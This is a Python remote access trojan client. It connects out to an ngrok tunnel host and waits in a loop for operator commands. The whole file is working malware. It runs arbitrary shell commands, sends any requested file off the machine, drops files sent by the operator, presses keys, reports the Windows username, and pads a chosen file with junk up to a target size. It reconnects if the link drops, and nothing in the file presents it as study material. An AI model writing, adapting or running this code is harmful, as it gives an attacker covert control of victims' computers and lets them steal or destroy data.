from socket import *
from colorama import Fore
from subprocess import getoutput
from re import findall
from pyautogui import click, hotkey, press, size, typewrite
from requests import get, exceptions
from time import sleep
import os
from datetime import datetime


byte_size = 500 * 1024 * 1024


def check_internet_conection()->bool:
    try:
        get("https://www.google.com",timeout=5)
        return True
    except Exception as err: 
        return False

while check_internet_conection() == False:
    sleep(2)
    print("No internet connection")


socket = socket(AF_INET,SOCK_STREAM)


# find ip4 address
def get_ipv4_address():
    while True:
        result = getoutput("ipconfig")

        ip_addresses = findall(r"   IPv4 Address. . . . . . . . . . . : (.*)", result)
        print(ip_addresses)
        try:
            ip_address = ip_addresses[1]
        except IndexError:
            print("Could not find")
            continue

        print(f"{Fore.GREEN} IPv4 Address: {ip_address}")

        return ip_address

# get_ipv4_address()


def content():
    while True:
        try:
            socket.connect(("0.tcp.eu.ngrok.io", 11560))
            # socket.connect((get_ipv4_address(), 2222))
            
            print("Connected")
            
            break
        except ConnectionRefusedError:
            pass

    return socket


socket = content()


def create_file_name():
    return f"{str(datetime.now().strftime('%Y%m%d_%H%M%S'))}"



def send_file(file_path):
    with open(file_path, 'rb') as file:
        socket.send(file.read())
    
def save_file(data):
    filename = create_file_name()
    bytes_txt , file_format = data.split("#")
    with open(f"{filename}{file_format}", 'wb') as file:
        file.write(bytes_txt)
        print(f"{Fore.GREEN}{filename} Saved!")
    

def run_cmd_command(command):
    result = getoutput(rf'{command}')
    if result == '':
        result = "runed"
    socket.send(result.encode())


def press_hotkey(keys):
    hotkey(keys.split("+"))
    socket.send("Runed".encode())

def get_windows_username(value):
    user = os.getlogin()
    socket.send(f"{value} : {user}".encode())

def increase_file_size(data):
    file_path, size_mg = data.split("|")
    size_mg = int(size_mg)
    target_size = size_mg * 1024 * 1024

    with open(file_path, 'w') as file:
        pass

    with open(file_path, 'ab') as file:
        while os.path.getsize(file_path) < target_size:
            file.write(b"DIGE GOHNAKHORIYAAAAA INTORYAST" * 1024 * 1024)
    socket.send("Runed".encode())

while True:
    try:
        shell = socket.recv(byte_size).decode()
        function_name, value = shell.split("!")
        if function_name == "cmd":
            run_cmd_command(value)

        elif function_name == "gf":
            send_file(value)
        
        elif function_name == "sf":
            save_file(value)
        
        elif function_name == "hk":
            press_hotkey(value)

        elif function_name == "gwun":
            get_windows_username(value)

        elif function_name == "lfv":
            increase_file_size(value)

        else:
            socket.send("command not fund!".encode())

    except ConnectionResetError:
        socket.close()
        socket = content()
        continue